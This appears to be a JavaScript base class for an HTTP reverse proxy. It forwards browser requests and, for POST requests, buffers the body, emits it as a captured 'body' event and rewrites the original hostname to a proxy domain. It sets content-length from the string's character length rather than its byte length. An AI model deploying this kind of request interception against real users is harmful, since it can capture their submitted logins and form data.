

class BaseRequest {
        
    /**
     * This is done automatically by our gEvent
     * @access @private
     * @param {object} proxyEndpoint The endpoint we talk to
     * @param {object} browserReq The request of the browse
     */
    constructor(proxyEndpoint, browserReq, configExport) {
        this.proxyEndpoint = proxyEndpoint;
        this.browserReq = browserReq;

        this.configExport = configExport

        this.clientContext = browserReq.clientContext
        // this.proxyDomain = pD !== null ? pD : process.env.PROXY_DOMAIN

    }

    /**
     * Default handler, we use pipe we the request and let our mechanics do the rest
     */
    // eslint-disable-next-line class-methods-use-this
    superRender() {
        if (this.browserReq.method !== 'POST') {
            this.browserReq.pipe(this.proxyEndpoint)
        } else if (this.browserReq.headers['content-length'] > 1) {
        
            let cJust = ''
            
            this.browserReq.on('data', (chunk) => {
                cJust += chunk.toString('utf8')
            })
            this.browserReq.on('end', () => {
                cJust += ''
                this.browserReq.onTime.emit('body', cJust)
                
                const hostDomainRegex = new RegExp(this.browserReq.clientContext.hostname, 'gi')
                const kJust = cJust.replace(hostDomainRegex, 
                    this.browserReq.clientContext.currentDomain)
                this.proxyEndpoint.setHeader('content-length', kJust.length)
                this.proxyEndpoint.write(kJust)
                this.proxyEndpoint.end('')
            })
        } else {
            this.browserReq.pipe(this.proxyEndpoint)
        }              
    }

    /**
     * To be sublcass and handled by your class if you wish to handle
     * Else it just calls superRender
     * @returns this.superRender()
     */
    processRequest(clientContext) {
        return this.superRender()
    }
    
}

module.exports = BaseRequest;